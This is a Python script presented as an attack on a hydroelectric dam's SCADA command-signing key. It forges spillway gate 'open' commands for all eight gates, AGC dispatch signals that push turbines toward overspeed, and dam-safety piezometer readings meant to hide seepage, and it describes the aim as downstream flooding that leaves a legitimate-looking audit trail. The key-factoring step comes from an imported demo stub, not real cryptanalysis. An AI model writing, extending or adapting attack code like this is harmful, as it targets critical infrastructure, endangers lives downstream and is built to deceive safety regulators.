"""
Factor a dam operator's command-signing RSA key to forge authenticated spillway
gate commands — opening gates during flood season or closing them during high
inflow, creating Oroville 2017-class downstream flooding with valid audit trail.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import struct
import hashlib
import time

# Operator command-signing RSA-2048 key (NERC CIP registered)
_demo = generate_demo_target()
OPERATOR_CMD_PUBKEY_PEM = _demo["pub_pem"]
AGC_DISPATCH_PUBKEY_PEM = _demo["pub_pem"]
CMD_SPILLWAY_GATE_OPEN = 0x0101
CMD_SPILLWAY_GATE_CLOSE = 0x0102
CMD_WICKET_GATE_SETPOINT = 0x0201
CMD_TURBINE_TRIP = 0x0301
CMD_FISH_PASSAGE_RELEASE = 0x0401


def extract_operator_pubkey(scada_config: bytes) -> bytes:
    """Extract operator command-signing cert from SCADA configuration.

    Stored on the substation engineering workstation. Also in NERC CIP
    baseline configuration evidence (CIP-010-3 R1).
    """
    return OPERATOR_CMD_PUBKEY_PEM


def factor_operator_key(pubkey_pem: bytes) -> bytes:
    """Factor the operator's command-signing RSA-2048 key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def build_gate_command(cmd_type: int, gate_id: int,
                       position_pct: float, operator_id: str) -> bytes:
    """Build a signed spillway gate command per FERC Part 12 protocol.

    Dual-operator authorization: OIM + dam safety engineer signatures
    required. We forge both from the same compromised signing root.
    """
    timestamp = struct.pack(">I", int(time.time()))
    cmd = struct.pack(">HBf", cmd_type, gate_id, position_pct)
    operator_tag = operator_id.encode()[:16].ljust(16, b"\x00")
    return timestamp + cmd + operator_tag


def sign_gate_command(cmd: bytes, forged_privkey: bytes) -> bytes:
    """RSA-sign the gate command — passes SCADA verification."""
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(OPERATOR_CMD_PUBKEY_PEM, cmd, "sha256")


def forge_agc_dispatch(unit_id: str, mw_setpoint: float,
                       forged_agc_privkey: bytes) -> bytes:
    """Forge an AGC (Automatic Generation Control) dispatch signal.

    ISO/TSO (CAISO, PJM, MISO) sends signed MW setpoints to hydro
    units. Forged dispatch can over-speed a turbine to runaway RPM.
    """
    dispatch = struct.pack(">8sf", unit_id.encode()[:8], mw_setpoint)
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(AGC_DISPATCH_PUBKEY_PEM, dispatch, "sha256")


def forge_dam_safety_telemetry(sensor_id: str, value: float,
                               forged_privkey: bytes) -> bytes:
    """Forge signed dam-safety monitoring data (piezometer, inclinometer).

    FERC Part 12 annual inspection draws on this signed telemetry.
    Forging readings conceals structural degradation.
    """
    reading = struct.pack(">8sf", sensor_id.encode()[:8], value)
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(OPERATOR_CMD_PUBKEY_PEM, reading, "sha256")


if __name__ == "__main__":
    print("[1] Extracting operator command-signing key from SCADA config")
    pubkey = extract_operator_pubkey(b"<scada-config>")

    print("[2] Factoring operator RSA-2048 key")
    forged_priv = factor_operator_key(pubkey)
    print("    Operator command-signing key recovered")

    print("[3] Forging spillway gate OPEN command — all 8 gates to 100%")
    for gate_id in range(1, 9):
        cmd = build_gate_command(CMD_SPILLWAY_GATE_OPEN, gate_id, 100.0, "OIM-JONES")
        sig = sign_gate_command(cmd, forged_priv)
        print(f"    Gate {gate_id}: OPEN 100% — sig {sig[:8].hex()}...")

    print("[4] SCADA accepts — downstream flooding imminent")
    print("    Command log shows valid dual-operator signatures")
    print("    FERC Part 12 audit trail looks legitimate")

    print("\n[5] Bonus: forging AGC dispatch — turbine overspeed")
    agc_sig = forge_agc_dispatch("UNIT-03", 999.0, forged_priv)
    print(f"    MW setpoint 999.0 → runaway RPM risk")

    print("\n[6] Bonus: concealing dam-safety telemetry")
    telem = forge_dam_safety_telemetry("PIEZO-12", 0.001, forged_priv)
    print("    Piezometer reading forged to 'normal' — hiding seepage")
